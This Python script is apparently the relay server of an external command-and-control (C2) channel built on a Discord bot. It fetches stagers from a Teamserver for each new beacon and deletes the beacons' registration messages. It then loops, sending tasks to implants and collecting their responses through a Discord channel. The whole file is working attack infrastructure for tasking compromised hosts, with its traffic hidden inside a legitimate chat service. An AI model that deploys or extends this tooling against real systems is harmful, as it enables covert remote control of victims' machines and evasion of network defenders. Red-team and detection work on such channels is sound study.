import discord
import asyncio
import argparse
import os
import sys
from utils import commonUtils
from utils.encoders import encoder_base64
from utils.transports import transport_discord
from time import sleep
from bot_client import client
import establishedSession
import configureStage
import config


# Discord bot token
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID'))

# Global dictionary to store beacon sessions
sock_beacons = {}

def importModule(modName, modType):
    """
    Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
    """
    prep_global = "global " + modType
    exec(prep_global)
    importName = "import utils." + modType + "s." + modName + " as " + modType
    exec(importName, globals())


async def createConnection(beaconId):
    """
    Function responsible for configuring the initial stager
    for an incoming connection. Will return the socket connection
    responsible for issuing tasks.

    Returns:
        socket connection to the Teamserver
    """
    # Start with logic to setup the connection to the external_c2 server
    sock = commonUtils.createSocket()

    if sock is None:
        # Handle the case where the socket creation fails
        print(commonUtils.color("Failed to create a socket connection.", status=False, warning=True))
        sys.exit(1)

    # Let's get the stager from the C2 server
    stager_status = await configureStage.loadStager(sock, beaconId)

    if stager_status != 0:
        # Something went horribly wrong
        print(commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True))
        sys.exit(1)

    return sock


async def sendTask(channel, task, beaconId):
    """
    Sends a task to the beacon via the `sendData` function, which transmits the data as a binary file.
    """
    # Check if the task is None or an empty string
    if task is None or task == "":
        print(f"Warning: No task available to send for beaconId {beaconId}.")
        return  # Early return if there's no task

    try:
        # Ensure the task is bytes
        if isinstance(task, str):
            task = task.encode()  # Convert string to bytes if necessary

        # Call the sendData function from commonutils to send the binary data
        await commonUtils.sendData(task, beaconId)

    except Exception as e:
        print(f"Error sending task: {e}")



async def fetchResponse(channel, beaconId):
    """
    Fetch responses from the beacon via Discord messages.
    """
    async for message in channel.history(limit=2):  # Adjust limit as needed
        if message.content.startswith(f"{beaconId}:RespForYou"):
            await commonUtils.retrieveData(beaconId)            
    return None


async def taskLoop(beaconId, channel):
    while True:
        if config.verbose:
            print(commonUtils.color(f"Checking for tasks for {beaconId}..."))

        # Get the new task (this could be from the Discord command channel)
        newTask = establishedSession.checkForTasks(beaconId)

        # Relay the task to the client
        if config.debug:
            print(commonUtils.color(f"Relaying task to {beaconId}"))

        # Send task via Discord, awaiting the coroutine properly
        await sendTask(channel, newTask, beaconId)  # Just await the function

        if config.verbose:
            print(commonUtils.color(f"Checking for response from {beaconId}..."))

        # Fetch and process responses, awaiting the coroutine
        response = await fetchResponse(channel, beaconId)
        if response:
            establishedSession.relayResponse(beaconId, response)

        # Sleep to avoid constant polling
        await asyncio.sleep(config.C2_BLOCK_TIME / 100)  # Use asyncio.sleep instead of time.sleep


async def fetchNewBeacons():
    """
    Fetches new beacons that have registered to the Discord channel via messages starting with "AGENT:".
    
    Returns:
        list - List of beacon IDs that need to be handled.
    """
    beacons = []
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        async for message in channel.history(limit=1):  # Adjust the limit based on need
            if message.content.startswith("AGENT:"):
                beaconId = message.content.split("AGENT:")[1]
                if beaconId not in beacons:
                    print(f"[+] Discovered new Agent in channel: {beaconId}")
                    beacons.append(beaconId)
                    await message.delete()  # Delete the message after detecting the beacon
        if beacons:
            print(f"[+] Returning {len(beacons)} beacons for first-time setup.")
        return beacons
    else:
        print(f"Error: Could not find command channel")
        return []


@client.event
async def on_ready():
    print(f'Logged in as {client.user}')


@client.event
async def on_message(message):
    """
    Triggered when the bot receives a message.
    This function checks for new agents (beacons) registering and processes tasks/responses.
    """
    if message.channel.id == CHANNEL_ID:
        beacons = await fetchNewBeacons()

        # Start a new task loop for this agent
        for beaconId in beacons:
            channel = message.channel
            sock = await createConnection(beaconId)
            if sock:
                print(f"[+] Established new session {beaconId}. Starting task loop.")
            # Create a new asyncio task for the taskLoop
                asyncio.create_task(taskLoop(beaconId, channel))
            # Store the socket in the beacons dictionary
                sock_beacons[beaconId] = sock


def main():
    # Argparse for certain options
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
    parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)

    args = parser.parse_args()

    # Assign the arguments to config.$ARGNAME
    if not config.verbose:
        config.verbose = args.verbose
    if not config.debug:
        config.debug = args.debug

    if config.debug:
        config.verbose = True

    # Import encoder and transport modules
    if config.verbose:
        print(commonUtils.color("Importing encoder module: ") + "%s" % config.ENCODER_MODULE)
    importModule(config.ENCODER_MODULE, "encoder")

    if config.verbose:
        print(commonUtils.color("Importing transport module: ") + "%s" % config.TRANSPORT_MODULE)
    importModule(config.TRANSPORT_MODULE, "transport")

    # Start bot
    client.run(DISCORD_TOKEN)
    

if __name__ == "__main__":
    main()
    
